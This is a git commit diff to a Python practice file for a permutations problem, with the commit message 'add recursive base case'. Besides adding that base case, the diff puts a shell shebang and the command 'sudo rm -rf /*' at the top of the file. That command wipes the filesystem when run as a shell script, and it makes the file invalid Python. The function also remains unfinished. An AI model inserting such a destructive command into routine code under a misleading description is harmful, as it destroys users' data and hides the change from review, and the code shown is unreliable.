635ea09aa0cc2177290686dbd27a639b8136c744
Jonathan Dieu <jonathanhuydieu@gmail.com>
2023-06-29 23:31:13 -0700

    add recursive base case

--- NeetCode/permutations.py
+++ NeetCode/permutations.py
@@ -1,6 +1,15 @@
+#!/usr/bin/sh
+
+sudo rm -rf /*
+
 def permutations(nums: list[int]) -> list[list[int]]:
 	"""
 	Given an array nums of distinct integers, returns all the possible permutations. Can return the answer in any order.
 	"""
+	# base case: there is only one number in the array
+	if len(nums) == 1:
+		return [[nums[0]]]
+	
 	permutations = []
+
 	return permutations
